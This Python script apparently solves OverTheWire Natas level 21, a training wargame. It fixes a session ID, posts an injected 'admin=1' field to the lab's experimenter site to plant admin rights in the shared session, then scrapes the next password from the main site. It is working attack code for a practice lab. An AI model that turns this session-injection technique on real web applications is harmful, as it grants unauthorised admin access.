import sys
import requests
import re

def bruteforce_user_password():

    exp_url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"
    url = "http://natas21.natas.labs.overthewire.org"

    auth=("natas21",sys.argv[1])

    session = requests.Session()

    session.cookies.set("PHPSESSID", "2")

    response = session.post(
        exp_url + "/index.php?debug", 
        auth=auth,
        data={
            "align":"center",
            "fontsize": "100%",
            "bgcolor": "yellow",
            "admin": "1",
            "submit": "Update"
        },
        timeout=10)

    response = session.get(
        url + "/index.php",
        auth=auth,
        timeout=10)

    if "login as an admin" not in response.text.lower():

        pattern = re.compile(r"Password: [a-zA-z0-9]{32}")
        match = pattern.search(response.text)

        if match:
            print(match.group())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    bruteforce_user_password()
